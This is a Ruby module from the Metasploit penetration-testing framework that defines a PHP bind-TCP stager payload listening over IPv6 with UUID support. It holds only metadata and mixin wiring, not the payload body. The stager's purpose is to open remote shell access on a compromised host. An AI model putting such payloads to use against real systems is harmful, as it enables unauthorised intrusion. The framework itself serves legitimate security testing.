##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/bind_tcp'
require 'msf/core/payload/php/bind_tcp'

module Metasploit4

  CachedSize = 1356

  include Msf::Payload::Stager
  include Msf::Payload::Php::BindTcp

  def self.handler_type_alias
    "bind_tcp_ipv6_uuid"
  end

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Bind TCP Stager IPv6 with UUID Support',
      'Description' => 'Listen for a connection over IPv6 with UUID Support',
      'Author'      => [ 'egypt', 'OJ Reeves' ],
      'License'     => MSF_LICENSE,
      'Platform'    => 'php',
      'Arch'        => ARCH_PHP,
      'Handler'     => Msf::Handler::BindTcp,
      'Stager'      => { 'Payload' => "" }
    ))
  end

  def use_ipv6
    true
  end

  def include_send_uuid
    true
  end

end
